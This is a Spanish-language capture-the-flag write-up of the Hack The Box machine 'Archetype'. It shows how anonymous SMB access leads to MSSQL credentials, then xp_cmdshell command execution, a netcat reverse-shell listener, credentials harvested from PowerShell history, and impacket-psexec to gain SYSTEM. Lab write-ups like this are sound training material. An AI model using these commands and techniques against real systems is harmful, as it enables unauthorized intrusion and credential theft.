# Archetype — HTB - EASY

## Reconocimiento

- Lanzamos un escaneo para identificar los puertos y servicios:

```bash
nmap -sCV -Pn 10.129.95.187
```

- Encontramos servicios SMB y Microsoft SQL Server.
- Enumeramos los recursos compartidos SMB:

```bash
smbclient -L 10.129.95.187
```

- Encontramos el recurso `backups` y accedemos sin contraseña:

```bash
smbclient -N //10.129.95.187/backups
```

- Dentro encontramos un archivo de backup que contiene credenciales para acceder al servidor Microsoft SQL Server.

## Enumeración

- Utilizamos las credenciales encontradas para acceder a MSSQL.
- Una vez dentro, comprobamos si podemos ejecutar comandos del sistema mediante `xp_cmdshell`.
- `xp_cmdshell` permite ejecutar comandos de Windows desde Microsoft SQL Server:

```sql
EXEC xp_cmdshell 'whoami';
```

- Conseguimos ejecutar comandos sobre la máquina Windows.

## Explotación

- Utilizamos `xp_cmdshell` para ejecutar una reverse shell y conseguir una conexión interactiva con la máquina.
- En nuestra máquina nos ponemos a la escucha:

```bash
nc -lvnp 4444
```

- Desde la máquina víctima ejecutamos la reverse shell mediante `xp_cmdshell`.
- Una vez conectados, comprobamos el usuario:

```cmd
whoami
```

- Para realizar la enumeración local, levantamos un servidor web en nuestra máquina:

```bash
python3 -m http.server 8000
```

- Utilizamos **WinPEASx64** para buscar posibles vectores de escalada de privilegios:

```cmd
winPEASx64.exe
```

- WinPEAS no encuentra ningún vector claro para escalar privilegios, por lo que continuamos con una enumeración manual.
- Revisamos los logs e historial de PowerShell en busca de información sensible y encontramos credenciales pertenecientes al usuario `Administrator`.

## Escalada de privilegios

- Instalamos Impacket en nuestra máquina:

```bash
sudo apt install python3-impacket
```

- Utilizamos `impacket-psexec` con las credenciales de `Administrator`:

```bash
impacket-psexec administrator@10.129.95.187
```

- Conseguimos un CMD remoto con privilegios elevados.
- Comprobamos nuestro contexto:

```cmd
whoami
```

- Obtenemos:

```text
nt authority\system
```

- Ya tenemos los máximos privilegios sobre la máquina.
- Vamos al escritorio del usuario y obtenemos la User Flag:

```cmd
cd C:\Users\<usuario>\Desktop
type user.txt
```

- Finalmente vamos al escritorio de `Administrator`:

```cmd
cd C:\Users\Administrator\Desktop
type root.txt
```

- Obtenemos la Root Flag.

## Reporte

- La máquina **Archetype** comienza con la enumeración de SMB, donde encontramos un recurso compartido `backups` accesible sin autenticación.
- Dentro del recurso encontramos un archivo que contiene credenciales para Microsoft SQL Server.
- Utilizamos estas credenciales para acceder a MSSQL y conseguimos ejecutar comandos del sistema mediante `xp_cmdshell`.
- A través de `xp_cmdshell` obtenemos una reverse shell sobre Windows.
- Una vez dentro, utilizamos **WinPEASx64** para realizar la enumeración local. No encontramos un vector claro de escalada, por lo que revisamos manualmente los logs e historial de PowerShell.
- Encontramos credenciales del usuario `Administrator`.
- Utilizamos **Impacket-psexec** con dichas credenciales para obtener un CMD remoto con privilegios de `NT AUTHORITY\SYSTEM`.
- Con estos privilegios conseguimos acceder tanto a `user.txt` como a `root.txt`.

### Cadena de ataque

```text
Nmap
 ↓
SMB
 ↓
Anonymous SMB
 ↓
backups
 ↓
Credenciales MSSQL
 ↓
MSSQL
 ↓
xp_cmdshell
 ↓
Reverse Shell
 ↓
WinPEAS
 ↓
PowerShell logs / historial
 ↓
Credenciales Administrator
 ↓
Impacket-psexec
 ↓
NT AUTHORITY\SYSTEM
 ↓
User Flag + Root Flag
```

## 🧠 Lessons Learned

- SMB puede permitir acceder a información sensible si existen recursos compartidos sin autenticación.
- Los archivos de backup pueden contener credenciales.
- `xp_cmdshell` permite ejecutar comandos de Windows desde Microsoft SQL Server.
- WinPEASx64 automatiza la enumeración de posibles vectores de escalada en Windows.
- Si WinPEAS no encuentra nada, debemos continuar con enumeración manual.
- Los logs e historial de PowerShell pueden contener credenciales.
- `impacket-psexec` permite ejecutar comandos remotamente utilizando credenciales de Windows.
- `NT AUTHORITY\SYSTEM` proporciona un contexto con privilegios máximos en Windows.
